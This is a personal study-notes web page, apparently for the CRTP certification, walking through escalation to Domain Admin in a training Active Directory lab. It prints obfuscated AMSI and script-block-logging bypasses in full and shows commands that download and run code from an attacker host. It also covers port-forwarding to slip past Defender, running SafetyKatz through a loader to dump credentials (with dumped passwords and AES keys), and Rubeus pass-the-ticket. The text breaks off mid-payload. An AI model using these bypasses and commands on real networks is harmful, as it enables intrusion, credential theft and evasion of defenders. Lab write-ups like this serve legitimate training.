@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Privilege Escalation via Domain Admin - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="active">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Privilege Escalation via Domain Admin</header>
+        <section class="about-text">
+          <div class="notion-content">
+<p>In this section we will do a privilege escalation from local Administrator do Domain Admin, by Identifying a machine in the target domain where a Domain Admin session is available.</p>
+<p>Currently we do have access to a compromised machine as Local Administrator as we can see on the screenshot below.</p>
+<p>We will use <code>Find-DomainUserLocation</code> on the target to look for machines where a domain admin is logged in.</p>
+<p>Let’s start by bypassing AMSI and enhanced logging. 
+First we bypass <strong>Enhanced Script Block Logging</strong> so that the AMSI bypass is not logged, by uploading the following as a .txt file.</p>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>Reflection.Assembly<span class="o">]</span>::<span class="s2">&quot;l`o`AdwIThPa`Rti`AlnamE&quot;</span><span class="o">((</span><span class="s1">&#39;S&#39;</span>+<span class="s1">&#39;ystem&#39;</span>+<span class="s1">&#39;.C&#39;</span>+<span class="s1">&#39;ore&#39;</span><span class="o">))</span>.<span class="s2">&quot;g`E`TTYPE&quot;</span><span class="o">((</span><span class="s1">&#39;Sys&#39;</span>+<span class="s1">&#39;tem.Di&#39;</span>+<span class="s1">&#39;agno&#39;</span>+<span class="s1">&#39;stics.Event&#39;</span>+<span class="s1">&#39;i&#39;</span>+<span class="s1">&#39;ng.EventProv&#39;</span>+<span class="s1">&#39;i&#39;</span>+<span class="s1">&#39;der&#39;</span><span class="o">))</span>.<span class="s2">&quot;gET`FI`eLd&quot;</span><span class="o">((</span><span class="s1">&#39;m&#39;</span>+<span class="s1">&#39;_&#39;</span>+<span class="s1">&#39;enabled&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;NonP&#39;</span>+<span class="s1">&#39;ubl&#39;</span>+<span class="s1">&#39;ic&#39;</span>+<span class="s1">&#39;,Instance&#39;</span><span class="o">))</span>.<span class="s2">&quot;seTVa`l`Ue&quot;</span><span class="o">([</span>Ref<span class="o">]</span>.<span class="s2">&quot;a`sSem`BlY&quot;</span>.<span class="s2">&quot;gE`T`TyPE&quot;</span><span class="o">((</span><span class="s1">&#39;Sys&#39;</span>+<span class="s1">&#39;tem&#39;</span>+<span class="s1">&#39;.Mana&#39;</span>+<span class="s1">&#39;ge&#39;</span>+<span class="s1">&#39;ment.Aut&#39;</span>+<span class="s1">&#39;o&#39;</span>+<span class="s1">&#39;mation.Tracing.&#39;</span>+<span class="s1">&#39;PSEtwLo&#39;</span>+<span class="s1">&#39;g&#39;</span>+<span class="s1">&#39;Pro&#39;</span>+<span class="s1">&#39;vi&#39;</span>+<span class="s1">&#39;der&#39;</span><span class="o">))</span>.<span class="s2">&quot;gEtFIe`Ld&quot;</span><span class="o">((</span><span class="s1">&#39;e&#39;</span>+<span class="s1">&#39;tw&#39;</span>+<span class="s1">&#39;Provid&#39;</span>+<span class="s1">&#39;er&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;N&#39;</span>+<span class="s1">&#39;o&#39;</span>+<span class="s1">&#39;nPu&#39;</span>+<span class="s1">&#39;b&#39;</span>+<span class="s1">&#39;lic,Static&#39;</span><span class="o">))</span>.<span class="s2">&quot;gE`Tva`lUe&quot;</span><span class="o">(</span><span class="nv">$null</span><span class="o">)</span>,0<span class="o">)</span>
+</code></pre></div>
+
+<p>We will use the following command to upload the file, or a simple copy/past of the command would also work.</p>
+<p><code>iex (iwr ``http://172.16.100.51/sbloggingbypass.txt`` -UseBasicParsing)</code></p>
+<p>The following command can be used to bypass AMSI.</p>
+<div class="highlight"><pre><span></span><code>S<span class="sb">`</span>eT-It<span class="sb">`</span>em<span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span>+<span class="s1">&#39;aR&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;blE:1&#39;</span>+<span class="s1">&#39;q2&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;uZ&#39;</span>+<span class="s1">&#39;x&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">([</span>TYpE<span class="o">](</span><span class="w"> </span><span class="s2">&quot;{1}{0}&quot;</span>-F<span class="s1">&#39;F&#39;</span>,<span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>Get-varI<span class="sb">`</span>A<span class="sb">`</span>BLE<span class="w"> </span><span class="o">((</span><span class="s1">&#39;1Q&#39;</span>+<span class="s1">&#39;2U&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>-VaL<span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;A`ss`Embly&quot;</span>.<span class="s2">&quot;GET`TY`Pe&quot;</span><span class="o">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;Uti&#39;</span>+<span class="s1">&#39;l&#39;</span><span class="o">)</span>,<span class="s1">&#39;A&#39;</span>,<span class="o">(</span><span class="s1">&#39;Am&#39;</span>+<span class="s1">&#39;si&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;.Man&#39;</span>+<span class="s1">&#39;age&#39;</span>+<span class="s1">&#39;men&#39;</span>+<span class="s1">&#39;t.&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;u&#39;</span>+<span class="s1">&#39;to&#39;</span>+<span class="s1">&#39;mation.&#39;</span><span class="o">)</span>,<span class="s1">&#39;s&#39;</span>,<span class="o">(</span><span class="s1">&#39;Syst&#39;</span>+<span class="s1">&#39;em&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;g`etf`iElD&quot;</span><span class="o">(</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s2">&quot;{0}{2}{1}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;a&#39;</span>+<span class="s1">&#39;msi&#39;</span><span class="o">)</span>,<span class="s1">&#39;d&#39;</span>,<span class="o">(</span><span class="s1">&#39;I&#39;</span>+<span class="s1">&#39;nitF&#39;</span>+<span class="s1">&#39;aile&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span>,<span class="o">(</span><span class="w"> </span><span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;S&#39;</span>+<span class="s1">&#39;tat&#39;</span><span class="o">)</span>,<span class="s1">&#39;i&#39;</span>,<span class="o">(</span><span class="s1">&#39;Non&#39;</span>+<span class="s1">&#39;Publ&#39;</span>+<span class="s1">&#39;i&#39;</span><span class="o">)</span>,<span class="s1">&#39;c&#39;</span>,<span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="o">))</span>.<span class="s2">&quot;sE`T`VaLUE&quot;</span><span class="o">(</span><span class="si">${</span><span class="nv">n</span><span class="sb">`</span>ULl<span class="o">}</span>,<span class="si">${</span><span class="nv">t</span><span class="sb">`</span>RuE<span class="o">}</span><span class="w"> </span><span class="o">)</span>
+</code></pre></div>
+
+<p>Now that we have bypassed <strong>Enhanced Script Block Logging</strong>and<strong>AMSI</strong>we can upload PowerView and run it in memory and use the Find-DomainUserLocation to check all the machines in the domain and find out if there’s any machine in the domain that has Domain Admin logged in session.</p>
+<p><code>iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.51/PowerView.ps1'))</code></p>
+<p>The command above will upload PowerView.ps1 and at the same time loads it to the target, our next step is just to execute the command, and wait for the result.
+Beware that this might take few minutes since it’s scanning the entire machines in the domain.</p>
+<p>What happens here is that our request is sent to the DC (Domain Controller) to retrieve all the computer name and membership of the domain administrators group then the request is sent to each and every machine in the domain, checking we have local admin access (Using the current local admin user), then it will check if there’s any domain admin session(logged in) in the machine.
+<code>Find-DomainUserLocation</code></p>
+<p>We can see above that we do have a Domain Admin session on a computer in the domain.
+ComputerName: <code>dcorp-mgmt</code>
+IP: <code>172.16.4.44</code></p>
+<p>Now that we were able to find a machine in the domain with a Domain Admin session logged in, we can abuse it using WinRS<strong>(Windows Remote Shell</strong>) or PowerShell Remoting.</p>
+<h2>Abusing Domain Admin Session With WinRS</h2>
+<p><strong>WinRS (Windows Remote Shell)</strong> is a command-line tool in Windows that allows remote execution of commands on a target machine. It can be used to establish a remote shell session for executing commands on a remote system.</p>
+<p>Nowadays commands like <code>whoami/hostname</code> are being tracked by the EDRs/MDEs, so instead of simply executing those commands straightforwards, we can use WinRS.
+As you can see above, we execute simply call winrs, pass the machine name and the commands we want to execute the the target.</p>
+<p><code>winrs -r:dcorp-mgmt hostname;whoami</code></p>
+<p>Above screenshot shows us that we are in the machine <code>dcorp-mgmt</code> and that we are <code>dcorp\ciadmin</code></p>
+<p>Ok now that we know that we do have access to the machine and we can execute commands on the target, we can try to get the credentials of the Domain Admin session we found out previously.</p>
+<p>Let’s use PELoader.exe.
+PELoader is a tool designed to load and execute encrypted malicious PE files on Windows systems, using various techniques to bypass security products. 
+So the main goal is to run SafetyKatz.exe on <code>dcorp-mgtm</code> is to extract credentials from it and to achieve this task we need to copy Loader.exe to dcorp-mgmt.
+Let’s start by copying PELoader.exe to out machine.</p>
+<p>We will use <code>iwr</code> for that.</p>
+<p><code>iwr ``http://172.16.100.51/Loader.exe`` -OutFile C:\Users\Administrator\.jenkins\workspace\Project0\Loader.exe</code></p>
+<p>Now let’s copy the Loader from our machine to our target (<code>dcorp-mgmt</code>). Please bare in mind that we are only able to copy this file from our machine to the target because we are also local admin in the target machine.</p>
+<p><code>echo F | xcopy C:\Users\Administrator\.jenkins\workspace\Project0\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe</code></p>
+<p>As we can see above, we do have the confirmation that we were able to copy Loader.exe to the target machine dcorp-mgmt.</p>
+<p>Now if we try to run PELoader.exe straight on the target machine <code>dcorp\mgmt</code>to execute <strong>SafatyKatz.exe</strong> on the target, we may get caught by the Windows Defender, because we are downloading and running an executable file from our remote server. 
+To avoid getting caught we can do a portforwarding.</p>
+<p>The below command is basically saying to the target machine (<code>dcorp-mgmt</code>) that any connection coming on port  8080 (<code>dcorp-mgmt</code>) will be redirected to port 80 in our  attacking machine(172.16.100.51).</p>
+<p><code>$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51"</code></p>
+<p><code>Please note</code> that we need to use the $null variable in the beginning of the line  to address output redirection issue avoiding our command line to freeze.</p>
+<p>Now we can Download SafetyKatz.exe and execute it in memory… The only moment we are touching the target disk is when we download PELoader.exe, SafetyKatz.exe is being executing in memory and not in the disk at all.</p>
+<p>For you to understand why we are using the loopback IP(127.0.0.1) in our command, during our portforwarding command we specified that whatever comes from any direction(0.0.0.0) to port 8080 should be redirected to our(attacker) IP in port 80, this way, Windows Defender will think that we are downloading and executing SafetyKatz.exe from our the local  web server(in this case  from the target itself), but the request is forwarded to our web server machine where we are hosting the SafetyKatz.exe.
+<code>$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit</code></p>
+<div class="highlight"><pre><span></span><code>Authentication<span class="w"> </span>Id<span class="w"> </span>:<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="m">63049</span><span class="w"> </span><span class="o">(</span><span class="m">00000000</span>:0000f649<span class="o">)</span>
+Session<span class="w">           </span>:<span class="w"> </span>Service<span class="w"> </span>from<span class="w"> </span><span class="m">0</span>
+User<span class="w"> </span>Name<span class="w">         </span>:<span class="w"> </span>svcadmin
+Domain<span class="w">            </span>:<span class="w"> </span>dcorp
+Logon<span class="w"> </span>Server<span class="w">      </span>:<span class="w"> </span>DCORP-DC
+Logon<span class="w"> </span>Time<span class="w">        </span>:<span class="w"> </span><span class="m">2</span>/21/2024<span class="w"> </span><span class="m">4</span>:07:44<span class="w"> </span>AM
+SID<span class="w">               </span>:<span class="w"> </span>S-1-5-21-719815819-3726368948-3917688648-1118
+
+<span class="w">         </span>*<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>svcadmin
+<span class="w">         </span>*<span class="w"> </span>Domain<span class="w">   </span>:<span class="w"> </span>DOLLARCORP.MONEYCORP.LOCAL
+<span class="w">         </span>*<span class="w"> </span>Password<span class="w"> </span>:<span class="w"> </span>*ThisisBlasphemyThisisMadness!!
+<span class="w">         </span>*<span class="w"> </span>Key<span class="w"> </span>List<span class="w"> </span>:
+<span class="w">           </span>aes256_hmac<span class="w">       </span>6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+<span class="w">           </span>aes128_hmac<span class="w">       </span>8c0a8695795df6c9a85c4fb588ad6cbd
+<span class="w">           </span>rc4_hmac_nt<span class="w">       </span>b38ff50264b74508085d82c69794a4d8
+<span class="w">           </span>rc4_hmac_old<span class="w">      </span>b38ff50264b74508085d82c69794a4d8
+<span class="w">           </span>rc4_md4<span class="w">           </span>b38ff50264b74508085d82c69794a4d8
+<span class="w">           </span>rc4_hmac_nt_exp<span class="w">   </span>b38ff50264b74508085d82c69794a4d8
+<span class="w">           </span>rc4_hmac_old_exp<span class="w">  </span>b38ff50264b74508085d82c69794a4d8
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="w"> </span>Authentication<span class="w"> </span>Id<span class="w"> </span>:<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="m">21303</span><span class="w"> </span><span class="o">(</span><span class="m">00000000</span>:00005337<span class="o">)</span>
+Session<span class="w">           </span>:<span class="w"> </span>Interactive<span class="w"> </span>from<span class="w"> </span><span class="m">0</span>
+User<span class="w"> </span>Name<span class="w">         </span>:<span class="w"> </span>UMFD-0
+Domain<span class="w">            </span>:<span class="w"> </span>Font<span class="w"> </span>Driver<span class="w"> </span>Host
+Logon<span class="w"> </span>Server<span class="w">      </span>:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+Logon<span class="w"> </span>Time<span class="w">        </span>:<span class="w"> </span><span class="m">2</span>/21/2024<span class="w"> </span><span class="m">4</span>:07:40<span class="w"> </span>AM
+SID<span class="w">               </span>:<span class="w"> </span>S-1-5-96-0-0
+
+<span class="w">         </span>*<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>DCORP-MGMT$
+<span class="w">         </span>*<span class="w"> </span>Domain<span class="w">   </span>:<span class="w"> </span>dollarcorp.moneycorp.local
+<span class="w">         </span>*<span class="w"> </span>Password<span class="w"> </span>:<span class="w"> </span><span class="m">4</span>?PhChKP<span class="o">(</span><span class="sb">`</span>?yW<span class="sb">`</span><span class="nv">E8</span><span class="o">=</span>VM2QI13O!i*3Q?WVB<span class="s2">&quot;X)=&gt;Il3=AczJ0^T!X]r&amp;:&amp;yG41`*/</span>$<span class="s2">^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g</span><span class="nv">$*</span><span class="s2">mXIQMXY(Sc?3\A6ICrX</span>
+<span class="s2">         * Key List :</span>
+<span class="s2">           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076</span>
+<span class="s2">           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854</span>
+<span class="s2">           rc4_hmac_nt       0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_old      0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_md4           0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754</span>
+</code></pre></div>
+
+<p>As we can see above, that’s the output after we execute the command and run SafetyKatz.exe. We were able to retrieve information like,  <code>SVCADMIN</code> &amp; <code>DCORP-MGMT$</code> passwords and AES256 Hashes.</p>
+<p>If you check properly on SVCADMIN session property, it says <code>Session: Service From 0</code>. It means that <strong>SVCADMIN</strong> is being used to run a service ion <code>DCORP-MGTM</code>.</p>
+<p>We do have 2 options here now that we do have the credentials and the AES256 hashes. We can either login using credentials or using AES256 hashes. both options (WinRS and Rubeus) could work, but Rubeus might be the more discreet and versatile approach.</p>
+<p>Detection: Using Rubeus and the TGT might be less noisy than WinRS, which could be detected by monitoring tools.
+Persistence: Having a TGT means you can operate with domain admin privileges for as long as the ticket is valid, which can be renewed.</p>
+<h3>### Using Rubeus to Request a TGT</h3>
+<p>Advantages: Stealthier, can be leveraged for multiple subsequent actions, persistence.</p>
+<ol>
+<li>Download and run Rubeus on a machine with the AES256 key.</li>
+<li>Request and inject the TGT as mentioned.</li>
+<li>Perform domain admin tasks silently using the ticket.</li>
+</ol>
+<p><strong>1. Request the TGT.</strong>This fetches a Ticket Granting Ticket (TGT) for the svcadmin user.
+<code>Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
+<ul>
+<li>
+<p>It requests a Ticket Granting Ticket (TGT) for the user svcadmin using the /user flag</p>
+</li>
+<li>
+<p>The /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 flag specifies the AES256 hash to be used for authentication. Only AES keys should be used with the /opsec flag</p>
+</li>
+<li>
+<p>The /opsecflag is used to make the Rubeus traffic more stealthy by sending aninitial AS-REQ without pre-authentication. If successful, the resulting AS-REP is decrypted and a TGT is returned. If not, an AS-REQ with pre-authentication is sent</p>
+</li>
+<li>
+<p>The /createnetonly:C:\Windows\System32\cmd.exe flag creates a new hidden process with a SECURITY_LOGON_TYPE of 9, equivalent to runas /netonly. This process is created with the specified program, C:\Windows\System32\cmd.exe. The process ID and LUID (logon session ID) are returned, allowing specific Kerberos tickets to be applied to this process.</p>
+</li>
+<li>
+<p>The /show flag makes the created process visible.</p>
+</li>
+<li>
+<p>The /ptt flag "passes-the-ticket" and applies the resulting Kerberos credential to the current logon session, similar to Mimikatz' kerberos::ptt function</p>
+</li>
+</ul>
+<p>In summary, this command requests a TGT for the <code>svcadmin</code> user using AES256 hashing, makes the request more stealthy using the <code>/opsec</code> flag, creates a new hidden process with <code>runas /netonly</code> privileges, makes the process visible, and applies the obtained ticket to the current logon session.</p>
+<p>We can see on the screenshot above that, after we execute Rubeus.exe in our local machine using all the flags mentioned above, it will open a new cmd session with Administrator privileges.
+Even tho we see it <code>whoami</code> as student451 which is out valid studentID, we see this because this is a <code>LOGON_TYPE = 9</code> as we can also see in the screenshot.</p>
+<p>Now…In this new CMD session with can use WinRS to remotely connect the the Domain Controller for example, because we know that <code>SVCADMIN</code> is a Domain Admin user and we have a valid session as <code>SVCADMIN</code> already.</p>
+<h3>### 2. Using WinRS</h3>
+<p>We will use now WinRS to remotely connect to the Domain Controller.</p>
+<p><code>winrs -r:dcorp-dc cmd</code></p>
+<h1>Derivative Local Admin Abuse</h1>
+<p>Privilege escalation using derivative local admin involves exploiting misconfiguration in the way local administrative access is granted to users. This can be done by identifying users who have been granted excessive local administrative privileges, often due to group membership or other misconfiguration.</p>
+<p>I think it is worth explaining the concept that refers to derivative local admin. Imagine we have a target system named “<code>WorkstationA</code>” that has the domain group “<strong>Network Ops</strong>” as a member of its local administrators group. Inside of the “<strong>Network Ops</strong>” group there is a user “<strong>Fred”</strong>, who on his machine “<code>WorkstationB</code>” has the domain group “<strong>Workstation Admins</strong>” as a member of its local admins. If there is a user “<strong>Sally</strong>” who is in the “<strong>Workstation Admins</strong>” domain group, she is a Derivative Local Admin of the original “<code>WorkstationA</code>”.</p>
+<p>A malicious attacker could gain access to <strong>Sally</strong> and compromise her credentials or token. Using this, the malicious user could gain access to “<code>WorkstationB</code>” and compromise <strong>Fred’s</strong> credentials or token. She could then use these credentials to become the local administrator on the original target, “<code>WorkstationA</code>”. As far as the red team is concerned, anybody in the “<strong>Workstation Admins</strong>” group would be a great target to gain access to the original system, because they could gain access to specific people in the <strong>Network Ops</strong> group. 
+While it might add a hop in the workflow, it only mildly obfuscates the attack path.</p>
+<p>Please beware that we don’t need to be local admin on the attacking machine, we only need to be local admin on the target machine.</p>
+<p>Let’s start by doing bypass loading invisi-shell and AMSI bypass into your MS-DOS session.</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code><span class="nx">S</span><span class="sb">`eT-It`</span><span class="nx">em</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span><span class="o">+</span><span class="s1">&#39;aR&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="o">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="o">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">([</span><span class="nx">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">&quot;{1}{0}&quot;</span><span class="o">-</span><span class="nx">F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">Get</span><span class="o">-</span><span class="nx">varI</span><span class="sb">`A`</span><span class="nx">BLE</span><span class="w"> </span><span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="o">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="nx">VaL</span><span class="w"> </span><span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET`TY`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span><span class="w"> </span><span class="o">-</span><span class="nx">f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="o">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="o">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="o">+</span><span class="s1">&#39;age&#39;</span><span class="o">+</span><span class="s1">&#39;men&#39;</span><span class="o">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="o">+</span><span class="s1">&#39;to&#39;</span><span class="o">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="o">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">&quot;{0}{2}{1}&quot;</span><span class="w"> </span><span class="o">-</span><span class="nx">f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="o">+</span><span class="s1">&#39;nitF&#39;</span><span class="o">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span><span class="w"> </span><span class="o">-</span><span class="nx">f</span><span class="p">(</span><span 